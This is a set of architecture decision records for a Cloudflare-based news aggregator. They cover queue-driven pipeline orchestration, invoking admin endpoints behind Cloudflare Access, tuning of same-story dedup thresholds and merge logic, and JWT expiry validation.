**Related requirements:** [REQ-PIPE-003](../../sdd/generation.md#req-pipe-003-same-story-dedupe-core-matching-contract) AC 1, AC 2, [REQ-PIPE-012](../../sdd/generation.md#req-pipe-012-same-story-matching-policy-variants) AC 2 (same-vendor penalty), [REQ-PIPE-009](../../sdd/generation.md#req-pipe-009-llm-re-rank-pass-for-borderline-same-story-candidates).

---

### AD37: Full pipeline run is backend-orchestrated; browser tab is display-only

**Status:** Accepted (2026-05-08)

**Decision:** The "Full pipeline run" admin action no longer drives phase advancement from the browser. A single POST `/api/admin/pipeline-run` creates a `pipeline_runs` audit row and enqueues one `pipeline-jobs` queue message; a dedicated queue consumer (`src/queue/pipeline-consumer.ts`) walks the seven phases (`reembed_flip → reembed_drain → scrape_kick → scrape_wait → embed_drain → dedup_kick → dedup_wait → done`) by self-chaining queue messages. The settings surface only POSTs once and polls `/api/admin/pipeline-status?id=…` for live progress.

**Context:** A 2026-05-08 production audit on `news.graymatter.ch` found same-event clusters that survived an operator-driven full pipeline run with all of AD32-AD36 already in place. Investigation showed the orchestrator was a JavaScript `while(!done)` loop in `src/pages/settings.astro` that POSTed `/api/admin/embed-backfill` and `/api/admin/historical-dedup` from the browser. On a mobile tab, background-tab throttling and tab sleep silently halted the loop mid-run; the dedup phase, gated behind the embed phase, never ran. The dedup-sweep already proved a queue self-chain pattern at one level down (`dedup_runs` + `dedup-sweep-consumer`); extending the same shape one level up over the seven pipeline phases removes the operator-tab dependency end-to-end.

**Alternatives considered:**

- **`ctx.waitUntil(self.fetch(…))` chains.** Rejected. `waitUntil` extends the current isolate's CPU budget; long chains still pay per-request edge cuts and cannot survive a worker restart. Queue messages cross isolate boundaries cleanly with platform-native retry envelopes.
- **A single Durable Object per pipeline run.** Rejected as overkill. The per-phase work is already idempotent against queue redelivery via CAS guards; introducing a DO would add a new infrastructure dependency for state that fits in one D1 row.
- **Keep the browser orchestrator with a warning.** Rejected. Mobile operators never see the "tab kept open" warning at the moment their tab sleeps. Silent failure is not acceptable; a queue-driven backend removes the dependency entirely.

**Rationale:** Cloudflare Queues self-chain is the same pattern the chunk-finalize handoff and the historical-dedup sweep already use; operators get one mental model ("background pipeline work continues without a tab"). Each phase consumer message gets a fresh CPU budget; transient failures retry via `max_retries=3`. The audit row is the single source of truth - closing the tab and reopening `/settings` later restores progress display from `pipeline_runs` exactly the way reopening recovers `dedup_runs` progress today.

**Consequences:**

- A new D1 table `pipeline_runs` records every "Full pipeline run" with phase, scrape_run_id, dedup_run_id, embed counters, error, started_at, updated_at.
- A new queue `pipeline-jobs` (and `pipeline-jobs-integration` mirror) is provisioned in both deploy workflows and bound in `wrangler.toml`.
- Two new admin routes: POST `/api/admin/pipeline-run` (kicker) and GET `/api/admin/pipeline-status` (poller).
- The `settings.astro` "Full pipeline run" button collapses from ~200 lines of phase-loop JavaScript to a single POST + a poll loop.
- The settings Administration surface was consolidated to a single "Refresh articles" action (2026-05-14): the previously-adjacent "Refresh feeds" scrape-only button was removed once it was confirmed to be billing-equivalent to the full pipeline run on `mode=full`. The `/api/admin/force-refresh` endpoint stays alive for cron paths and scripted callers.

**Related requirements:** [REQ-OPS-009](../../sdd/observability.md#req-ops-009-admin-pipeline-run-progress-surface) AC 2 (the run continues irrespective of the operator's tab state), [REQ-PIPE-014](../../sdd/generation.md#req-pipe-014-same-story-operator-surfaces) AC 1 (the dedup phase consumer is unchanged; pipeline-consumer just kicks it).

---

### AD38: CF Access-protected admin endpoints must be invoked via top-level navigation, not fetch()

**Status:** Accepted (2026-05-08)

**Decision:** Browser-initiated calls to `/api/admin/*` endpoints that are protected by Cloudflare Access must use `window.location.assign(url)` (top-level navigation), not `fetch()`. The `/api/admin/pipeline-run` kicker in `src/pages/settings.astro` was changed from a `fetch(kickUrl)` call to `window.location.assign(kickUrl)`. The endpoint responds with a `303 See Other` redirect back to `/settings?pipeline=enqueued&pipeline_run_id=...`; the settings page reads that URL signal on load and resumes progress polling.

**Context:** Cloudflare Access protects `/api/admin/*` by intercepting unauthenticated requests and redirecting the browser through an SSO flow (`news.graymatter.ch` -> `cloudflareaccess.com` -> `news.graymatter.ch`). When `fetch()` is used in CORS mode, the browser cannot follow a cross-origin redirect that sets credentials (the `CF_Authorization` cookie belongs to the Access domain, not the app domain). The result is a network-level "Failed to fetch" error regardless of the user's auth state. A top-level navigation walks the redirect chain natively: the browser follows each hop, the Access cookie is set, and the final request arrives at the Worker with a valid `CF_Authorization` header.

**The `Sec-Fetch-Site` check that was considered for `mode=wipe` was dropped** because the post-SSO redirect chain itself poisons the `Sec-Fetch-Site` header to `cross-site` (the last redirect originates from `cloudflareaccess.com`). A `Sec-Fetch-Site` guard that rejects `cross-site` would therefore block the operator's own legitimate post-SSO request. The actual security boundary is CF Access plus the `ADMIN_EMAIL` gate in `src/middleware/admin-auth.ts`; a cross-origin `<img src=...>` trigger against `mode=wipe` still requires a valid `CF_Authorization` cookie, which only the authenticated operator's browser holds.

**Alternatives considered:**

- **`fetch()` with `credentials: 'include'`** against the Access-gated endpoint. Rejected. CORS mode still cannot follow the cross-origin SSO redirect to set a cookie on the Access domain; the browser blocks the redirect with a CORS error before the cookie exchange.
- **A separate un-gated proxy endpoint** making server-side calls to the Access-gated route. Rejected: an un-gated proxy performing privileged work defeats the Access perimeter; a future mistake could expose the proxy without exposing the original endpoint.
- **Keep fetch() and rely solely on the Worker gate (no CF Access).** Acceptable as a long-term state, but Access provides a meaningful UX improvement (SSO redirect vs. bare 401) that operators expect.

**Rationale:** Top-level navigation is the browser's native mechanism for following cross-origin redirects with credential exchange. The `303 -> /settings?pipeline=enqueued` round-trip lets the kicker remain stateless (no WebSocket, no long-poll) while giving the settings UI a clean URL-based handoff signal. The pattern is already used by `force-refresh.ts` for the same reason.

**Consequences:**

- Every browser-invoked state-changing admin endpoint must use `window.location.assign()` + `303`, or be called from a server-side route not behind CF Access. `fetch()` in CORS mode is not a valid path when Access is active.
- `Sec-Fetch-Site` headers are unreliable as a defense-in-depth signal for any endpoint reachable via a CF Access redirect chain. Use the Worker admin-auth gate (`CF_ACCESS_AUD` + `ADMIN_EMAIL`) as the authoritative security boundary instead.
- The settings page must handle the `?pipeline=` URL parameter on load and convert it to localStorage state before any polling logic runs.

**Related requirements:** [REQ-OPS-009](../../sdd/observability.md#req-ops-009-admin-pipeline-run-progress-surface) AC 4 (terminal status persistence survives reload), [REQ-OPS-005](../../sdd/observability.md#req-ops-005-admin-force-refresh-endpoint)

---

### AD39: Raise dedup auto-merge threshold to 0.88 and gate merges to a 72h news-cycle window

**Status:** Accepted (2026-05-08)

**Decision:** `DEDUP_COSINE_THRESHOLD` rises from `"0.78"` to `"0.88"` on production and integration, widening the LLM-rerank borderline band from `[0.70, 0.78)` to `[0.70, 0.88)`. A new `DEDUP_TIME_WINDOW_SECONDS` env var (default `"259200"`, 72h) gates the match-filter loop in both the finalize-consumer and the historical-dedup batch helper: pairs whose `published_at` differ by more than this window are skipped before the cosine check, regardless of score. The rerank prompt and `mergeAsAltSource` plumbing are unchanged.

**Context:** A 2026-05-08 production sweep produced a visible 13-source false-merge cluster on the Hacker News article "Bridging the AI Agent Authority Gap" (`01KQ206AW96SW3KSJA0626V7M5` on `news.graymatter.ch`). Articles spanning **9 days** (Apr 23 → May 2) on the broad theme "AI agent security/identity/governance" - including the operator's own blog post - collapsed onto the Hacker News story as alt-sources. The cluster members are independent events (separate WorkOS posts on OAuth-for-agents and MCP authentication, InfoQ presentations, a Palo Alto Networks blog) that share topical vocabulary, not the same announcement re-reported by multiple outlets.

The 0.78 threshold from AD36 was tuned against tightly-bounded news-cycle clusters (PAN-OS zero-day, PANW valuation week) but did not anticipate dense theme topics where independent events score 0.78-0.86 on cosine alone.

**Alternatives considered:**

- **Raise threshold to 0.85 only.** Rejected. 0.85 still leaves several pairs from the false-merge cluster above the auto-merge bar; the empirical floor of dense-theme false-positives sits closer to 0.86 in the 2026-05-08 audit.
- **Add LLM rerank above the auto-merge threshold.** Rejected as incoherent. Reranking a trusted band signals a misplaced threshold. Raising auto-merge is the correct fix; the uncertain stripe then falls into the rerank band.
- **Add the time-window gate without raising the threshold.** Rejected as insufficient. Some cluster pairs were within 24h; the time window kills multi-day spread but same-day dense-theme cases still need LLM disambiguation, which only triggers below auto-merge.
- **Re-run historical dedup to un-merge the cluster.** Rejected. Loser rows were deleted and their vectors removed by `mergeAsAltSource`; un-merging requires re-scraping and re-embedding original URLs. Forward-only fix.

**Rationale:** The merge contract is "same news event, not same topic." A 9-day spread on a dense theme is by construction never one event. The time-window gate is a hard filter the operator can reason about without understanding cosine geometry. The threshold raise widens the LLM rerank band so dense-theme cases at 0.78-0.88 get a binary "same event yes/no" judgment instead of auto-merging. The two knobs together cover the two failure modes the AD36 calibration missed: cross-news-cycle theme drift (time window) and within-news-cycle topical similarity (rerank band).

**Consequences:**

- The LLM rerank band widens from 8 to 18 cosine points, adding a handful of LLM calls per tick at typical scrape sizes (≤200 articles). Well under the cron CPU budget.
- This fix is forward-only; existing false-merge clusters stay merged. To un-merge manually: list `article_sources` rows for the surviving article id, drop false-positive rows, re-scrape the dropped source URLs so the next ingestion embeds them as standalone articles.
- `DEDUP_TIME_WINDOW_SECONDS` is the env-var lever for tuning the window; the `DEDUP_COSINE_THRESHOLD` lever is unchanged in shape (only the value moved). Both are runtime-tunable without redeploy.
- Two new structured log lines: `finalize_match_skipped_time_window` and `historical_dedup_match_skipped_time_window`, each carrying `delta_seconds`, `self_id`, `match_id`. These let operators measure how often the time-window gate fires versus how often the cosine gate fires - useful for future calibration.
- The `dedup-diag` admin endpoint already surfaces cosine + threshold + same-publisher flag ([REQ-PIPE-014](../../sdd/generation.md#req-pipe-014-same-story-operator-surfaces) AC 4); time-delta is observable from the diag's published_at fields without an explicit additional surface.

**Related requirements:** [REQ-PIPE-012](../../sdd/generation.md#req-pipe-012-same-story-matching-policy-variants) (same-news-cycle window), [REQ-PIPE-009](../../sdd/generation.md#req-pipe-009-llm-re-rank-pass-for-borderline-same-story-candidates)

---

### AD40: Equal-time ULID tie-break, high-confidence cosine band, topK bump, and per-article diagnostic logs

**Status:** Accepted (2026-05-09)

**Decision:** Four targeted changes to the dedup match-filter pipeline that close a silent-drop bug and add deterministic handling for near-duplicate-headline pairs without re-litigating the AD39 threshold calibration:

1. **Equal-time ULID tie-break** in `scrape-finalize-consumer.ts:256`. Replace `if (matchPublishedAt >= self.published_at) continue;` with the strict-greater check plus a ULID tie-break - `if (matchPublishedAt === self.published_at && self.id <= match.id) continue;` - parallel to `historical-dedup.ts:201-202`. Wire-syndicated stories often share epoch-second `published_at` after RSS pubDate parsing; the prior `>=` filter silently dropped every such pair.
2. **High-confidence cosine band** (`DEDUP_HIGH_CONFIDENCE_COSINE`, default `"0.92"`). Pairs whose raw cosine clears this bar auto-merge unconditionally, bypassing the same-vendor penalty and the rerank band.
3. **TopK bump 5 → 20** in both `scrape-finalize-consumer.ts` and `historical-dedup.ts`. Vectorize cost is per-query, not per-result.
4. **Per-article diagnostic log** (`finalize_dedup_diag`). One structured info line per article; `decision` is one of: `auto_merge`, `rerank_pending`, `no_eligible_older_match`, `no_match_below_floor`, `no_candidates`. High-confidence band hits vs regular-threshold merges are distinguishable via `candidates_high_confidence` counter on the same line - not a separate decision string.

**Context:** The 2026-05-09 production digest on `news.graymatter.ch` showed two clear under-merge cases the post-AD39 calibration could not explain by threshold alone:
- 6 articles about the same Cloudflare Q1 2026 earnings call + 20% workforce reduction, from 6 different vendors (qz.com, latimes.com, finance.yahoo.com, sdxcentral.com, barrons.com, news.ycombinator.com), all on the same day, NOT merged.
- 2 near-identical-headline articles (`IAM Union Demands Full Accountability After Boeing Employee Death` + `IAM Calls for Accountability Following Boeing Employee Fatality`) from wire-syndicated sources, NOT merged.

External-LLM and Opus-ultrathink critique of the initial fix proposal (multi-rerank in finalize + rewriting the `When unsure, prefer false` bias) flagged that:
- Multi-rerank addresses an asymmetry that doesn't fire in the canonical cross-tick sequence - each new article in finalize has at most one older candidate per tick, so the 2nd-N borderlines never exist to walk.
- Rewriting the conservative bias in the rerank prompt risks reintroducing the AD39 dense-theme failure mode.
- The Boeing pair is most plausibly explained by `scrape-finalize-consumer.ts:256` silently dropping equal-`published_at` pairs - a bug `historical-dedup.ts:201-202` already fixed for its oldest-first walk.
- A high-confidence cosine band ABOVE the regular threshold deterministically catches near-duplicate-headline pairs without re-litigating threshold calibration.

**Alternatives considered:**

- **Lower the threshold back to 0.85.** Rejected. AD39 explicitly rejected 0.85 against the dense-theme empirical false-positive floor of 0.86; the 72h gate alone does not buy enough headroom to revisit it.
- **Multi-rerank in finalize-consumer.** Deferred. Helps only in same-tick clusters with multiple borderline older candidates; the canonical cross-tick sequence has at most one. Multiplies hallucination risk in dense-theme clusters N×. Revisit if production logs show the same-tick case is common.
- **Lower the same-vendor penalty.** Rejected. The high-confidence band already neutralises the penalty's punishing effect at near-duplicate cosines without weakening it for the genuine same-publisher boilerplate inflation it was tuned against.
- **Rewrite the `When unsure, prefer false` bias.** Rejected. The conservative default is load-bearing for AD39's dense-theme calibration. New terms like "same incident" trigger on topical clusters. Concrete positive examples were added to the prompt instead, without softening the default.

**Rationale:** Diagnose first, retune second. The ULID tie-break is a 1-line correctness fix with no calibration risk. The high-confidence band has a deterministic semantic story (`raw cosine >= 0.92 means the headlines and bodies are restating each other`) and sits above AD39's empirical false-positive floor of 0.86 with margin; it catches near-duplicate-headline pairs where the same-vendor penalty would otherwise drop a 0.93 cosine into the rerank band.

The AD39 threshold raise widened the rerank band from 8 cosine points (0.70-0.78) to 18 (0.70-0.88); in dense-theme periods the 5 nearest neighbours can be consumed by topical noise above 0.80, starving the loop of the actual same-event candidate at rank 6+ — hence the topK bump as cheap insurance. The diagnostic log gives operators the cosine numbers needed to tune the rerank prompt or threshold from real production data instead of speculation. Together these recover the under-merge cases the AD39 fix did not anticipate while preserving the 13-source false-merge protection.

**Consequences:**

- Wire-syndicated near-duplicate pairs (Boeing IAM, Reuters/AP-style stories) merge deterministically via the high-confidence band, regardless of same-vendor penalty arithmetic.
- Same-second `published_at` pairs across sources now merge through the finalize-consumer (one direction; the lower-ULID is the merge target). Previously dropped silently.
- Per-tick log volume rises by one info line per new article (~20-30 lines per typical scrape tick). Acceptable; the log lines are structured and aggregate cheaply.
- Vectorize.queryById issues 4× more candidate slots per call (topK=20 vs 5). Bandwidth and per-call latency are negligible at this scale.
- The rerank prompt lists four positive-example shapes (earnings calls, CVE advisories, workplace incidents, market follow-ons) without changing the conservative default. LLM behavior shifts slightly toward `true` on textbook same-event pairs while preserving dense-theme calibration.
- This fix is forward-only; it does NOT un-merge the existing 13-source false-merge cluster from before AD39 (separate operation per AD39 consequences).

**Related requirements:** [REQ-PIPE-012](../../sdd/generation.md#req-pipe-012-same-story-matching-policy-variants) AC 2 (same-publisher stricter bar), [REQ-PIPE-009](../../sdd/generation.md#req-pipe-009-llm-re-rank-pass-for-borderline-same-story-candidates)

---

### AD41: Bidirectional finalize merge + automatic post-tick dedup sweep

**Status:** Accepted (2026-05-09)

**Decision:** Two structural fixes to the same-story matcher that recover the under-merge cases AD39 + AD40 did not address:

1. **Bidirectional finalize merge** in `src/queue/scrape-finalize-consumer.ts`. The match loop now allows both directions; the pair's older article wins regardless of which side was just ingested. `mergeAsAltSource(winner, loser)` keeps the older title/body; the newer becomes the alt-source row.
2. **Automatic post-tick dedup sweep** in `processOneFinalize`'s gate-flip block. After `finalize_recorded` flips, the consumer enqueues one `dedup-sweep` continuation scoped to `AUTO_SWEEP_LOOKBACK_SECONDS`; the sweep self-chains via the existing operator queue path.

**Context:** The 2026-05-09 production digest on `news.graymatter.ch` showed three distinct unmerged near-duplicate pairs that cosine + threshold tuning alone could not explain:

- **InfoQ ↔ infoq.com** (Cloudflare Dynamic Workflows, cosine **0.924**). Cross-tick (4h apart, Vectorize fully consistent), cross-eTLD+1 (GN proxy URL vs direct), well above the high-confidence band introduced in AD40. Should auto-merge in finalize. Did not.
- **LA Times ↔ KRON4** (Cloudflare layoffs, **0.896**). KRON4 arrived 24h after LA Times with an EARLIER `published_at`. The strictly-older filter rejected LA Times - direction logic only handled "fold self into older," never "fold newer match into self."
- **Geeky Gadgets ↔ Let's Data Science** (Claude Cowork, cosine **0.881**). Same scrape run, same epoch second. Vectorize eventual consistency: at finalize time, `queryById` could not see the sibling vector upserted moments earlier in the same chunk consumer.

Across 153 articles ingested in the 24h window before the diagnosis, only 3 cluster merges had landed. The historical sweep had last run ~26h earlier (operator-triggered, not scheduled) so anything finalize missed accumulated as visible duplicates until the next operator click.

**Alternatives considered:**

- **Intra-batch pairwise cosine in finalize-consumer.** Deferred. The auto-sweep catches same-second siblings ~40 minutes later via the existing well-tested sweep path. Adding pairwise math in finalize doubles the matcher's surface area without closing the case sooner.
- **Schedule the sweep via cron instead of enqueueing post-finalize.** Rejected. The post-finalize trigger guarantees vectors are upserted before the sweep starts; a standalone cron risks running before chunks finish embedding on slow ticks.
- **Sweep the full corpus on every tick.** Rejected on cost. Full-corpus sweeps take ~30 minutes wall-clock at 1.3k articles. A 48h-scoped sweep typically runs sub-minute and exercises the same merge code path.
- **Make `historical-dedup` a real cron rather than a queue chain.** Rejected. The queue-driven self-chain is the existing pattern (AD35) and lets a long sweep cross isolate boundaries cleanly. Reusing it as the automatic path keeps one mental model.

**Rationale:** Diagnose-first, then close the structural gaps the diagnosis exposed. The pre-2026-05-09 match-filter loop rejected every candidate whose `published_at` was greater than `self.published_at`; the intent was "self folds INTO an older match", the unintended consequence was that a newly-arrived article predating an already-stored match could merge only through the operator-triggered historical sweep.

The bidirectional merge is a 1-direction-to-2-direction generalisation of code already in the consumer; the existing semantics (older wins) is preserved unchanged for the canonical case. The auto-sweep reuses the queue-driven sweep added in AD35 and the `runHistoricalDedupBatch` body extracted there; the operator path stays available for full-corpus sweeps. The 48h lookback is tight enough that each sweep is cheap and overlapping with prior sweeps is harmless (`mergeAsAltSource` is idempotent - the loser is gone after the first merge, subsequent walks skip it).

**Consequences:**

- Late-arriving-older articles merge in the same tick they land. The KRON4 / LA Times-style pair is now a single card on first visibility.
- Same-second-sibling pairs that finalize cannot see (Vectorize consistency lag) merge within ~30s of finalize completion via the auto-sweep, instead of waiting 4-26h for an operator click.
- The auto-sweep adds ~50-100 articles per tick to its scan (typical 48h corpus tail size). At sub-minute wall-clock per sweep, the cron-tick budget impact is negligible.
- `dedup_runs` rows accumulate at one per tick (every 4h) plus operator clicks. Retention sweeping `dedup_runs` is out of scope; rows are small, mostly numeric.
- Per-article diagnostic log volume in `wrangler tail` doubles for ticks where the sweep also matches a window-overlapping article - the same finalize_dedup_diag shape now appears for the sweep walk too.
- Forward-only fix. The next auto-sweep after deploy catches existing visible duplicates from the 2026-05-09 corpus, which fall within the 48h lookback at deploy time.

**Related requirements:** [REQ-PIPE-003](../../sdd/generation.md#req-pipe-003-same-story-dedupe-core-matching-contract), [REQ-PIPE-009](../../sdd/generation.md#req-pipe-009-llm-re-rank-pass-for-borderline-same-story-candidates) (threshold raise + rerank cap removal)

---

### AD42: Bidirectional historical-dedup + sweep cursor aligned with time window + multi-rerank

**Status:** Accepted (2026-05-10)

**Decision:** Three further structural fixes to the same-story matcher that recover the under-merge cases AD41 did not anticipate. All three apply to the dedup pipeline downstream of cosine + threshold; none change calibration:

1. **Bidirectional historical-dedup sweep** in `src/lib/historical-dedup.ts`. Two passes per `self`: PASS 1 folds `self` into an older auto-merge candidate (mirrors AD41); PASS 2 absorbs newer matches into `self` (unchanged).
2. **Auto-sweep cursor aligned to `DEDUP_TIME_WINDOW_SECONDS`** in `src/queue/scrape-finalize-consumer.ts` (`AUTO_SWEEP_LOOKBACK_SECONDS` derived at runtime). Closes the prior 24h dead zone between cursor and window.
3. **Multi-rerank in finalize-consumer** in `src/queue/scrape-finalize-consumer.ts`. Sorts all borderline candidates by direction-preference + cosine and walks the top `RERANK_CANDIDATE_CAP=5`, taking the first same-event=true verdict.

**Context:** The 2026-05-10 production digest on `news.graymatter.ch` showed a 13-article fragmented cluster about the same Cloudflare Q1 2026 earnings + 1100-job AI restructuring story (Reuters, WSJ, KRON4, IBD, Yahoo Finance, CNBC, Hacker News, Barron's, San Francisco Chronicle, Yahoo Finance Singapore - all describing the same news event over 4 days, May 7-10). Direct Vectorize cosine inspection across the cluster (token-by-token via `query_by_id` on production):

- Yahoo Plunge ↔ CNBC = **0.9309** (auto-merge band)
- Yahoo Plunge ↔ IBD = **0.9063** (auto-merge band)
- Yahoo Plunge ↔ Yahoo Singapore = **0.9036** (auto-merge band)
- Yahoo Plunge ↔ Reuters = **0.8898** (just below threshold, rerank band)
- WSJ ↔ Reuters = **0.8666** (mid-rerank band)
- Reuters ↔ all-other-cluster = 0.83-0.89 (rerank band)
- Hacker News (oldest anchor) ↔ all-other-cluster = 0.74-0.86 (rerank band)

Three reasons the AD41 fix did not collapse this cluster:

- Cluster's pub-time spread of 70h (May 7-10) exceeded the 48h auto-sweep cursor. After 05-09 20:23, older anchors fell below the cursor; the time-window gate (72h) said "same event" but the cursor said "out of reach."
- Even when a sweep `self` was in scope, the one-direction logic only absorbed NEWER matches. Newer members could not fold INTO older anchors 5-10h away (within the 72h window, cosine in auto-merge band) - silently skipped at line 212.
- Pairs like Reuters-vs-WSJ (0.8666) sit in the rerank band. The single-rerank path picks the top candidate; if it is an unrelated near-neighbour, the same-event sibling is missed. Multi-rerank capped at top-5 finds it within 2-3 attempts.

**Alternatives considered:**

- **Lower the auto-merge threshold below 0.88.** Rejected. AD39 raised it specifically to fix the 13-source AI-agent governance false-merge; the empirical false-positive floor in dense theme periods is around 0.86. Lowering the bar revives that failure mode.
- **Run a full-corpus historical-dedup sweep on every tick.** Rejected on cost. Full-corpus is ~30min wall-clock; each tick adding that load is wasteful. The 72h cursor catches the realistic worst-case cluster span without the cost.
- **Switch to event-clustering instead of pairwise merges.** Considered as v2. Out of scope for this commit; the pairwise model has not been falsified, just incomplete.
- **Always rerank ALL borderline candidates uncapped.** Rejected. Capped at 5 to bound queue wall-clock. In practice the same-event sibling lands within the first 2-3 attempts; uncapped runs amplify hallucination risk in dense-theme clusters by N×.

**Rationale:** Each fix closes a specific failure mode the diagnosis exposed. Bidirectional historical-dedup mirrors AD41's pattern (consistency between the per-tick path and the operator/auto-sweep path). The 72h cursor removes a window/cursor mismatch that no other knob compensates for. Multi-rerank reuses the same `rerankBorderlinePair` that the existing path already invokes - the only change is iterating instead of stopping after one. Together they recover the cross-day clusters that AD41 left fragmented without re-litigating threshold calibration.

**Consequences:**

- Cross-day clusters spanning up to 72h now collapse via the auto-sweep within one cron tick of the latest member's ingestion.
- Cluster anchors below the cursor were unreachable pre-AD42; now newer-arriving cluster members fold INTO older anchors via PASS 1 of the bidirectional sweep.
- Per-tick rerank call volume rises modestly (from `rerankCalls` ≤ N articles to ≤ 5×N at worst-case). Empirical observation expected: ~1.3-1.8× pre-AD42 volume because most articles either auto-merge or have ≤ 2 borderline candidates worth walking.
- The auto-sweep's per-tick scan size grows from ~50-100 articles to ~80-150 articles (50% increase, matching cursor-width increase). Sub-minute wall-clock budget unchanged.
- This fix is forward-only. The 2026-05-10 fragmented Cloudflare-layoffs cluster is collapsed by the operator-triggered full-corpus historical-dedup sweep that runs alongside this commit; future clusters of similar shape collapse on first finalize tick after the latest sibling lands.

**Related requirements:** [REQ-PIPE-012](../../sdd/generation.md#req-pipe-012-same-story-matching-policy-variants), [REQ-PIPE-013](../../sdd/generation.md#req-pipe-013-same-story-cross-tick-automation-and-retention-coupling) AC 3 (cross-tick automatic sweep), [REQ-PIPE-009](../../sdd/generation.md#req-pipe-009-llm-re-rank-pass-for-borderline-same-story-candidates) (multi-rerank cap)

---

### AD43: Shared per-match dedup classifier; outer control flow stays per-consumer

**Status:** Accepted (2026-05-12)

**Decision:** Both the per-tick finalize consumer and the historical sweep delegate per-match scoring to one classifier (`classifyMatchPair` in `src/lib/bidirectional-dedup.ts`) while keeping their own outer control flow.

**Context:** Pre-AD43 each consumer reimplemented the same per-match logic - time-window gate, high-confidence band, same-vendor penalty, threshold gate, rerank floor, equal-time ULID tie-break, direction flag. Cycle-1 review flagged the drift as CF-002: the two implementations subtly disagreed on what counted as a borderline pair (the historical sweep had no rerank cap; finalize capped at 5), and any future tuning had to be applied in two places under the constant risk of partial application.

**Alternatives considered:**
- **Fully unified `pickMergeDecision`** owning scoring, winner selection, and rerank dispatch. Rejected: consumers have different intents (finalize picks one pair; sweep runs PASS 1 + PASS 2). A single function re-encodes the divergence as a parameter matrix, not removes it.
- Leave the two implementations as-is and rely on review discipline to keep them in sync. Rejected: the drift CF-002 surfaced is the empirical evidence that this doesn't hold.

**Rationale:** The classifier captures the part of the logic that is genuinely shared (per-pair scoring rules and band classification). The outer control flow - single-pass winner selection in finalize vs PASS 1/PASS 2 anchor-and-absorb in the historical sweep - is genuinely different intent and belongs at the call site. The split makes the boundary explicit instead of letting it drift.

**Consequences:**

- Both consumers now produce identical band classifications for the same (self, match, params) tuple, eliminating CF-002's drift class.
- Outer control flow is preserved verbatim. Finalize keeps RERANK_CANDIDATE_CAP=5; the historical sweep keeps its no-cap pattern (the queue consumer has a 15-min budget per message). The per-consumer caps are explicit and visible at each call site.
- Future tuning of the scoring rules (e.g., adding a tertiary penalty) happens in one place.
- CF-029 (cache the comparator secondary key) is satisfied naturally - each match is classified exactly once and reuses the result.

**Related requirements:** [REQ-PIPE-003](../../sdd/generation.md#req-pipe-003-same-story-dedupe-core-matching-contract), [REQ-PIPE-009](../../sdd/generation.md#req-pipe-009-llm-re-rank-pass-for-borderline-same-story-candidates)

---

### AD44: Cloudflare Access JWT `exp` validation; signature still trusted from the perimeter

**Status:** Accepted (2026-05-12)

**Decision:** `decodeAccessJwt` in `src/middleware/admin-auth.ts` now validates the `exp` claim is present and in the future. JWT signature continues to be unverified server-side (AD25 → AD29).

**Context:** Cycle-1 review flagged CF-007: the access-token decoder accepted any well-formed JSON payload, including one with no `exp` claim or an `exp` in the past. Cloudflare Access stamps `exp` on every legitimate token, and the perimeter rejects expired tokens before they reach the worker. But defence-in-depth requires the worker to also reject expired tokens - a stolen long-lived token from before a rotation window, or a synthetic non-Access token that somehow reached the worker, would otherwise pass admin auth despite being unusable upstream.

**Alternatives considered:**
- Verify the JWT signature server-side. Rejected per AD29: requires fetching the JWKS, caching it in KV with rotation, and the perimeter already does this. The signature trust boundary stays at Access.
- Validate every JWT claim Cloudflare Access emits (`iat`, `iss`, `nbf`). Rejected: not all claims are stable across Access versions, and the security delta over `exp` alone is negligible since the perimeter already enforces them.

**Rationale:** `exp` is the one claim with concrete defence-in-depth value: it catches the long-lived-stolen-token replay class without re-litigating the signature-trust boundary AD29 established. The check is a single comparison against `Date.now()`, no external dependencies.

**Consequences:**

- A long-lived stolen Access JWT from before the perimeter rotated keys is now rejected even if it somehow reaches the worker.
- A synthetic non-Access JWT missing `exp` is rejected with the same null path as malformed payloads.
- Test fixtures that minted Access JWTs without `exp` need to add one (single fixture function change).
- Signature trust still terminates at the Access perimeter. Worker code does not verify the RS256 signature, and AD29 + AD30 remain the governing decisions for the perimeter contract.

**Related requirements:** [REQ-AUTH-001](../../sdd/authentication.md#req-auth-001-sign-in-with-a-federated-identity-provider)

---

### AD45: Accepted orchestration-file sizes (coordinator, chunk-consumer, settings.astro)

**Status:** Accepted (2026-05-11)

**Decision:** The current file sizes of `src/queue/scrape-coordinator.ts` (1230 lines), `src/queue/scrape-chunk-consumer.ts` (1117 lines), `src/queue/scrape-finalize-consumer.ts` (767 lines), and `src/pages/settings.astro` (1944 lines) are accepted as-is. The project's 800-line file cap does not apply to these orchestration hot paths until a concrete extraction has a measurable win (test isolation, bundle size, review effort).

**Context:** Cycle-1 review flagged CF-001: four orchestration files exceed the project's 800-line cap from `coding-style.md`. AD17, AD18, and AD19 already rejected three specific narrow extractions (`dedupe-groups.ts`, `deferred-candidates.ts`, `tag-railing-flip-core.ts`) on the same files. This AD generalizes that pattern: the orchestration hot paths are dense, sequentially-coupled state machines whose readability lives in keeping the full pipeline visible in one file. Splitting them speculatively into per-step modules costs more in import-site churn and reviewer context-switching than it saves.

**Alternatives considered:**
- **Extract coordinator's Step 1-8 into `step-N-*.ts` modules.** Rejected: the steps share `scrape_run_id`, `env`, and partial result state through closure. Eight modules require either a shared god-type context object or per-step argument lists re-deriving state. Cognitive load moves, not shrinks.
- **Extract `processOneFinalize` and `runHistoricalDedupBatch` loop bodies.** Rejected at this scope: they are individual functions inside the accepted files. The per-function size rule still applies; extraction is welcomed when a future change makes it natural.
- **Extract `settings.astro`'s inline `<script>` and `<style>`.** Rejected: the script is tightly coupled to DOM IDs and the Pattern B IIFE constraint (AD20). The style uses Astro's component-scoped CSS and would lose isolation if extracted.

**Rationale:** The files are large because the orchestration is genuinely complex, not because the code is poorly factored. AD17/18/19 demonstrated that targeted extractions on these same files yielded worse code (extra modules, broken downstream gating, lost DOM coupling). Pre-emptively splitting without a forcing function repeats that anti-pattern at scale. The 800-line cap remains the default for new code and for files outside this list.

**Consequences:**

- Future contributors editing these four files must take care: the size threshold no longer signals "this file is too big." Use diff scope and function size as the navigation aid instead.
- Reviewer agents (code-reviewer, spec-reviewer) MUST NOT flag these four files on size alone. A finding citing total line count without a concrete extraction proposal that includes the cost analysis above should be dismissed by referencing this AD.
- The per-function size rule (`Functions are small (<50 lines)`) is unchanged. Functions inside these files remain subject to it; extraction is welcomed when a concrete bug, test gap, or review-velocity win motivates the change, and required when an individual function exceeds 50 lines.
- If a future feature naturally splits one of these files (e.g., the coordinator's source-enumeration phase becomes queue-driven per CF-006's eventual fix), the extraction is welcomed. This AD does not block extractions - it blocks size-only refactors.

